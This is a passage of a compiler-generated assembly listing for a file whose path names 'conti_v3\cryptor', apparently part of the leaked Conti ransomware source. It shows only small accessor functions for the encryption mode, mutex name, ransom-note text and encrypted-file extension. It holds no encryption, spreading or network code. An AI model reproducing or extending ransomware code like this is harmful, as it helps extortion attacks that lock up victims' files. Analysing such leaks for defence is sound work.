  00012	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__4DC440E3_global_parameters@cpp
  00019	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 35   : 	g_EncryptMode = EncryptMode;

  0001e	8b 85 e0 00 00
	00		 mov	 eax, DWORD PTR EncryptMode$[rbp]
  00024	89 05 00 00 00
	00		 mov	 DWORD PTR ?g_EncryptMode@@3HA, eax ; g_EncryptMode

; 36   : }

  0002a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00031	5f		 pop	 rdi
  00032	5d		 pop	 rbp
  00033	c3		 ret	 0
?SetEncryptMode@global@@YAXH@Z ENDP			; global::SetEncryptMode
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\global\global_parameters.cpp
;	COMDAT ?GetMutexName@global@@YAPEADXZ
_TEXT	SEGMENT
?GetMutexName@global@@YAPEADXZ PROC			; global::GetMutexName, COMDAT

; 27   : {

$LN3:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__4DC440E3_global_parameters@cpp
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 28   : 	//return g_MutexName;
; 29   : 	return NULL;

  0001b	33 c0		 xor	 eax, eax

; 30   : }

  0001d	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00024	5f		 pop	 rdi
  00025	5d		 pop	 rbp
  00026	c3		 ret	 0
?GetMutexName@global@@YAPEADXZ ENDP			; global::GetMutexName
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\global\global_parameters.cpp
;	COMDAT ?GetDecryptNote@global@@YAPEADXZ
_TEXT	SEGMENT
?GetDecryptNote@global@@YAPEADXZ PROC			; global::GetDecryptNote, COMDAT

; 21   : {

$LN3:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__4DC440E3_global_parameters@cpp
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 22   : 	return g_DecryptNote;

  0001b	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:?g_DecryptNote@@3PADA ; g_DecryptNote

; 23   : }

  00022	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00029	5f		 pop	 rdi
  0002a	5d		 pop	 rbp
  0002b	c3		 ret	 0
?GetDecryptNote@global@@YAPEADXZ ENDP			; global::GetDecryptNote
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\global\global_parameters.cpp
;	COMDAT ?GetExtention@global@@YAPEA_WXZ
_TEXT	SEGMENT
?GetExtention@global@@YAPEA_WXZ PROC			; global::GetExtention, COMDAT

; 15   : {

$LN3:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__4DC440E3_global_parameters@cpp
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 16   : 	return g_Extention;

  0001b	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:?g_Extention@@3PA_WA ; g_Extention

; 17   : }

  00022	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00029	5f		 pop	 rdi
  0002a	5d		 pop	 rbp
  0002b	c3		 ret	 0
?GetExtention@global@@YAPEA_WXZ ENDP			; global::GetExtention
_TEXT	ENDS
END
